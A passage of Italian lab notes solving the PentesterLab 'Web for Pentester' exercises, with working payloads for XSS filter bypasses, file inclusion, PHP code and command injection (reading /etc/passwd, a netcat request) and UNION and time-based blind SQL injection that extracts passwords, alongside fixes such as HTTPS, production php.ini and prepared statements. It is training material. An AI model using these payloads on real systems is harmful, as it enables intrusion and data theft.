# Web for Pentester

Le challenge sono disponibili da interfaccia web.

Login amministratore:
- **user**: user
- **passwd**: live

[Spiegazioni challenge](https://pentesterlab.com/exercises/web-for-pentester#:~:text=Examples%20of%20Web%20vulnerabilities)

## Fix generale: pagine servite mediante HTTP
Il virtual host di default abilitato sulla macchina serve pagine in HTTP, visionabili quindi in chiaro tramite un qualsiasi software in grado di ispezionare la comunicazione di rete, ad esempio Wireshark.

Occorre quindi abilitare il virtual host HTTPS. Per farlo si eseguono i seguenti passaggi:
1. Ottenimento di certificato SSL/TLS e rispettiva chiave privata. Si può ricevere un certificato firmato da una CA oppure si può utilizzare un certificato self-signed tramite la propria chiave privata, che non garantisce la veridicità del server ma almeno permette il funzionamento di HTTPS.
La macchina dispone di un certificato di default */etc/ssl/certs/ssl-cert-snakeoil.pem* firmato dalla rispettiva chiave privata di default */etc/ssl/private/ssl-cert-snakeoil.key*
2. Si abilita il modulo SSL di apache2
```bash
a2enmod ssl #abilitazione modulo ssl
a2ensite default-ssl #abilitazione virtual host
```
3. Si riavvia il server
```bash
/etc/init.d/apache2 restart
```

Nel caso di WFP, viene utilizzata la libreria SSL 3.0, ritenuta obsoleta da molti browser moderni. Per verificare il funzionamento di quanto fatto quindi occorre utilizzare il browser Epiphany che accetta anche questa versione di SSL.

## Soluzioni challenge 

### XSS 1

E' possibile iniettare qualsiasi codice HTML nella querystring tramite parametro name

### XSS 2
In questo livello vengono eliminate le sottostringhe di apertura e chiusura del tag *script*. Per aggirare il filtro basta scrivere anche solo una lettera in case diverso, ad esempio "sCript"

### XSS 3
Il filtro in questo livello elimina *script* a prescindere dal case. Però è comunque possibile far rimanere i tag *script* se appositamente "incastrati" ad altri tag *script*, in questo modo:
```text
name=<script<script>>alert('ciao')</script</script>>
```

### File Include 1

Tutti gli errori eccetto i deprecati sono abilitati nel web server (si veda sempre *php.ini* in etc/php5/apache2/). Inoltre qualsiasi file viene incluso nell'output della pagina, basta inserire il percorso nel parametro page della querystring.

Inserendo un nome invalido si ottiene un warning contenente tante belle informazioni.

Si può ad esempio stampare il contenuto di /etc/passwd.

#### Fix: stampa di messaggi di debug abilitata anche su server in produzione
Si può utilizzare la configurazione di default di *php.ini* per un server in produzione. La challenge invece utilizza una configurazione con *display_errorrs=On*.
Si copia il file */usr/share/php5/php.ini-production* in *php.ini* e si riavvia il server. I messaggi di debug non saranno più visibili.

### Code Injection 1

Lo script php corrispondente contiene la possibilità di effettuare una code injection in questa linea.
```php
$str="echo \"Hello ".$_GET['name']."!!!\";";
```

Inserendo nel parametro name il payload seguente verrà eseguito il comando *id*, e si potrebbe eseguire un comando arbitrario
```text
name=hacker";system(id);//
```

### Code Injection 2
Si può iniettare codice arbitrario tramite parametro *order* utilizzato dalla funzione *create_function*.
```text
order=id,"");}system('uname -a');//
```
Dove:
- la prima parentesi tonda serve a chiudere lo *strcmp*
- la parentesi graffa serve a chiudere anticipatamente la funzione anonima che si sta creando
- i commenti alla fine sono necessari per commentare il resto della riga senza far crashare

### Code Injection 3
Si può manipolare la funzione *preg_replace* a proprio piacimento tramite parametri della query string.
```text
new=system('cat /etc/passwd')&pattern=/hacker/e&base=Hello hacker
```
In questo modo viene eseguito il comando specificato da system ogni volta che viene incontrato il pattern, grazie al carattere speciale **/e** che effettua un *eval* per ogni match.

### Code Injection 4
Il parametro *name* viene passato alla funzione *assert*, che in vecchie versioni di PHP valuta l'argomento passato come espressione. Per rompere lo script basta inserire il seguente payload.
```text
name=hacker'.phpinfo().'
```
*Assert* interpeta il valore passato come una concatenazione di stringhe, e valuta anche *phpinfo()* o qualsiasi altra funzione per stabilirne il valore da inserire nella stringa.

### Command Injection 1
Nessun controllo effettuato sul parametro della query string. Basta concatenare un qualsiasi comando con ;
```bash
ip=127.0.0.1;cat /etc/passwd
```

### Command Injection 2
In questo livello viene applicato un filtro che applica una regex multine, questo significa che solo una linea del testo deve soddisfare la regex. Si inserisce quindi il comando in seguito ad uno **\n**.
```bash
ip=127.0.0x1%0Acat /etc/passwd
```
Questo funziona perchè la prima linea della stringa contiene la regex, mentre la seconda no. Senza il modificatore **/m** la stringa non verrebbe validata siccome la ricerca non si fermerebbe allo **\n** e includerebbe anche il comando iniettato, che invaliderebbe la verifica.

### Command Injection 3
In questo livello fine applicato il filtro dello scorso livello, ma il non superamento del filtro in realtà non fa terminare il programma, che invece esegue un redirect. Tramite netcat quindi è comunque possibile visionare l'output del comando iniettato.
```bash
echo -ne "GET /commandexec/example3.php?ip=127.0.0.1%3bcat%20/etc/passwd\r\n" | nc host port
```

## SQL Injection

### Info utili
- In SQL il commento è esprimibile con **#** o con **--**
- In SQL due query possono essere agganciate con:
    - **;** (stacked query)
    - **OR/AND**
    - **UNION**. Quest'ultimo operatore permette di eseguire altre query SQL arbitrarie a patto che restituiscano lo stesso numero di colonne e avere dati compatibili

Per verificare il numero di colonne si possono usare due metodi:
- **ORDER BY *1,2,3,...*** che ordina le righe per i valori della colonna specificata. Per ottenere il numero di righe basta eseguire *ORDER BY* (oltre alla query legittima) finchè non da errore. Una volta trovato N errore allora significa che le colonne sono N-1
- **UNION SELECT *NULL, NULL, ...*** che permette di unire una query select che seleziona elementi nulli (compatibili con ogni dato in SQL). Una volta trovato il numero di NULL che produce un output significa che si è trovato il numero di colonne

Infine, per capire quali colonne vengono stampate basta fare una *UNION SELECT* sostituendo ai vari NULL dei valori costanti ad esempio una sequenza di interi e vedere il risultato in output.

Una volta conosciuto il numero di colonne che richiede la query, è possibile unire un altro statement arbitrario per stampare valori interessanti, tra cui:
- **version()** -> versione del DBMS
- **database()** -> database attuale
- **current_user()** -> utente attualmente connesso al DBMS
Ognuna di queste funzioni corrisponde ad un valore stampabile da SELECT

Il database di sistema **information_schema** contiene info sulla struttura di tutti i database serviti dal server, e contiene le seguenti tabelle interessanti:
- **tables**
    - colonna *table_name* -> nome tabella
    - colonna *table_schema* -> nome del database in cui si trova la tabella
- **columns**
    - colonna *column_name* -> nome colonna
    - colonna *table_name* -> nome tabella in cui si trova la colonna
    - colonna *table_schema* -> nome del database in cui si trova la tabella in cui si trova la colonna
Ispezionando queste tabelle è possibile venire a conoscenza di tutti i campi che compongono una tabella del database ed enumerarli con uno statement SQL apposito insieme alla *UNION*.

In caso non si disponga di abbastanza colonne è possibile usare *concat()* che concatena valori di colonne diverse in un'unica colonna ad esempio *SELECT concat(id,’:’,name,’:’,passwd)*

### SQL Injection 1

Vedendo il codice sorgente è possibile notare che viene eseguita una query su DB nel formato **' + INPUT + '**, dove i due apici sono inseriti automaticamente. Non ci sono ulteriori sanitizzazioni quindi è possibile ad esempio ritornare l'intera tabella utenti con il payload seguente, da passare tramite querystring.

```sql
‘ OR 1=1%23
```
Il **%23** è l'encoding di **#**, che serve a commentare l'altro apice inserito dallo script che renderebbe invalido il payload.

Con la seguente richiesta è possibile visualizzare tutte le password in chiaro degli user nella tabella *users*, ottenuta coi passaggi sopra.
```text
name=root' union select concat(id,',',name,',',passwd),2,3,4,5 from users%23
```

#### Fix: L'output permette di distinguere tra crash, output nullo e output non nullo
Si esegue il codice PHP relativo alla query sul database in un tag php a parte, preceduto dalla stampa degli header della tabella e seguito dalla stampa del footer della pagina. In tale tag php, inoltre, viene stampato il risultato solo se la query ha effettivamente restituito qualcosa. In questo modo non è più possibile distinguere tra errore o output nullo.

#### Fix: Inutile stampa di tutti i record della query nonostante ne serva solo uno
Basta eliminare il ciclo fatto sulle righe del risultato della query

#### Fix: Prepared statement
Si può sostituire la query con un prepared statement. Con questa modifica l'inieizione di SQL diventa impossibile.
```php
$lnk = mysqli_connect("localhost", "pentesterlab", "pentesterlab");
$lnk->select_db('exercises');
$stmt = $lnk->prepare("SELECT * FROM users where name= ?"); 
$stmt->bind_param('s', $_GET["name"]);
$stmt->bind_result($id, $name, $age, $groupid, $passwd);
$stmt->execute();
```

### SQL Injection 2
In questo livello sono vietati gli spazi, quindi per eseguire l'injection si usano i tab, encodati.
```text
name=root'%09UNION%09select%09id,name,passwd,4,5%09from%09users%23
```

### SQL Injection 3
In questo livello sono vietati anche i tab, quindi si usano i commenti in linea.
```text
name=root'/**/UNION/**/select/**/id,name,passwd,4,5/**/from/**/users%23
```

### SQL Injection 8

Ispezionando lo script php della challenge si nota che viene eseguita una query che ordina la colonna specificata dal parametro *order* tramite clausola ORDER BY. Il valore del parametro viene filtrato dalla funzione php *mysql_real_escape_string()* che permette di fare escape su alcuni caratteri per evitare iniezioni SQL. Il backtick ` però è utilizzabile.

Ce ne si accorge perché la seguente query da un output.
```text
order=name`%23
```

Non è comunque possibile iniettare SQL con *UNION* siccome *ORDER BY* agisce sulle colonne e in ogni caso la tabella *users* viene stampata integralmente, senza possibilità di unire altre righe.

Si può sfruttare comunque la debolezza per eseguire un **distinguisher/oracolo**, che permette ad esempio di estrarre dal database informazioni importanti come ad esempio una password. In questo esempio si mostra come trovare il nome del database usando un distinguisher.

Si deve creare un distinguisher che abbia un comportamento diverso in caso di un certo evento. 

Innanzitutto, si inserisce questa query:
```text
name` OR sleep(5)
```
Questa query esegue l'ordinamento sulla base dell'espressione logica inserita. Inoltre, dato che la tabella non ha indici registrati, il metodo di ordinamento è **filesort** e questo implica l'esecuzione della query e successivamente l'ordinamento seguendo uno scan lineare. Quindi, viene prima eseguita integralmente la query. La query proposta sopra, in particolare, converte ogni valore di name per ogni riga di users in un intero: in SQL qualsiasi stringa non nulla non iniziante per un numero viene convertita a 0 quindi FALSE. La funzione sleep viene sempre valutata FALSE per segnalare l'assenza di errori. Quindi, in AND lo sleep non viene mai eseguito e in OR viene eseguito per ogni riga.

Si introduce la funzione IF, che valuta una certa condizione logica arbitraria e restituisce un valore in base a che sia true o false. Si utilizza questo metodo e si costruisce la seguente query.
```text
name` OR IF(LENGTH(DATABASE())=1,sleep(1),NULL)%23
```
Tramite la query così costruita, questa volta lo sleep viene eseguito solamente se la condizione nell IF è vera, altrimenti non si esegue alcuna attesa. Tramite il distinguisher così costruito si possono effettuare vari tentativi per capire qual è la lunghezza del nome del database.

Un altro impiego utile è quello di capire il nome del database. In questo caso si esegue un distinguisher che effettua una ricerca binaria su una lettera alla volta.
```text
name` OR IF(ASCII(SUBSTRING(DATABASE(),1,1))>Mi,SLEEP(1),NULL)
name` OR IF(ASCII(SUBSTRING(DATABASE(),1,1))<Ni,SLEEP(1),NULL)
```
La ricerca binaria deve essere eseguita sostituendo a M ed N i rispettivi codici ASCII dei caratteri che si stanno valutando, che per i caratteri stampabili vanno da 32 a 127. Ad esempio
```text
name` OR IF(ascii(substring(DATABASE(),1,1))>101,sleep(1),null)%23
```

